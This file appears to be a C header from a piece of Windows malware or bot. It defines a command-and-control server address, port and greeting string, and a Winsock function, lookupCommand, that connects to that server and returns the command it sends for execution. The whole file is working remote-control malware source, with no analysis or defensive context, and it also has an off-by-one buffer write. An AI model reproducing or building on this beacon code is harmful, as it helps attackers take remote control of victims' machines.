/*
 * contact.h
 *
 *  Created on: Jul 4, 2014
 */

#ifndef CONTACT_H_
#define CONTACT_H_

#define CONST_CONTACT_C2_ADDRESS 	"192.168.1.97"
#define CONST_CONTACT_C2_PORT	 	2311
#define CONST_CONTACT_C2_HELLOCMD	"HELLO-MY-MASTER-WHAT-IS-YOUR-WISH"
#define CONST_CONTACT_C2_MAXBUFF	1024

/**
 * lookupCommand
 *
 * Contact C2 to find a command to execute.
 */
BOOL lookupCommand(char *receivedCommand) {

	// Structs and Winsock2 Data
	WSADATA wsaData;
	SOCKET s;
	struct sockaddr_in server;
	char server_reply[CONST_CONTACT_C2_MAXBUFF];
	int recv_size;

	// Starting WSA Socket
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	// Creating a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;

	// Configuring socket connection
	server.sin_addr.s_addr = inet_addr(CONST_CONTACT_C2_ADDRESS);
	server.sin_family = AF_INET;
	server.sin_port = htons(CONST_CONTACT_C2_PORT);

	// Connecting with the C2
	if (connect(s, (struct sockaddr *) &server, sizeof(server)) < 0)
		return FALSE;

	// Send command to Server
	if (send(s, CONST_CONTACT_C2_HELLOCMD, strlen(CONST_CONTACT_C2_HELLOCMD), 0)
			< 0)
		return FALSE;

	// Receiving socket response
	memset(server_reply, 0x00, CONST_CONTACT_C2_MAXBUFF);
	if ((recv_size = recv(s, server_reply, CONST_CONTACT_C2_MAXBUFF, 0))
			== SOCKET_ERROR)
		return FALSE;

	// Crap trick for end string
	server_reply[recv_size] = '\0';
	strncpy(receivedCommand, server_reply, recv_size + 1);

	// Close socket
	closesocket(s);

	// free Winsock library
	WSACleanup();

	// Returning command
	return TRUE;
}

#endif /* CONTACT_H_ */
